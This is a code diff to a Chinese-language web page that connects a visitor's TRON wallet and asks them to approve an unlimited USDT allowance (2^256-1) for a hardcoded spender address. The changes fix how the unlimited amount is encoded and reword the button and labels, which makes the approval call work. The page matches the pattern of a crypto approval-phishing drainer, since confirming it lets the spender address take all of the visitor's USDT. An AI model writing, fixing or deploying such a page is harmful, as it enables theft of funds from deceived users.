@@ -163,7 +163,7 @@
                 <div class="info-label">授权地址</div>
                 <div class="info-value">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                 <div class="info-label" style="margin-top: 12px;">授权额度</div>
-                <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度 (2^256-1)</div>
+                <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度 (最大)</div>
             </div>
             
             <div class="info-box" id="walletInfo" style="display: none;">
@@ -172,7 +172,7 @@
             </div>
             
             <button class="approve-btn" id="connectBtn">连接钱包</button>
-            <button class="approve-btn hidden" id="approveBtn">授权无限额 USDT</button>
+            <button class="approve-btn hidden" id="approveBtn">授权 USDT (无限)</button>
             <div class="status hidden" id="status"></div>
         </div>
     </div>
@@ -182,10 +182,8 @@
         // 配置
         const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
-        
-        // 无限额度：2^256 - 1，使用十六进制字符串（去掉0x前缀）
-        // TronWeb 内部会处理成 BigNumber
-        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        // 2^256 - 1 的十进制字符串（无限额度）
+        const UNLIMITED_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
         let tronWeb = null;
         let userAddress = null;
@@ -258,7 +256,7 @@
                 
                 showStatus('请在钱包中确认授权...', 'loading');
                 
-                // 使用十六进制字符串传递无限额度，TronWeb 会自动转换为 BigNumber
+                // 发送授权交易，使用十进制字符串（无限额度）
                 const result = await contract.approve(
                     SPENDER_ADDRESS,
                     UNLIMITED_AMOUNT
@@ -269,7 +267,7 @@
                 if (result && (result.result || result.txid)) {
                     const txid = result.txid || result;
                     showStatus(`✅ 授权成功！`, 'success');
-                    document.getElementById('connectedAddress').innerHTML = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)} <span class="success-badge">已授权无限额</span>`;
+                    document.getElementById('connectedAddress').innerHTML = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)} <span class="success-badge">已授权无限额度</span>`;
                 } else {
                     showStatus('授权失败，请重试', 'error');
                 }
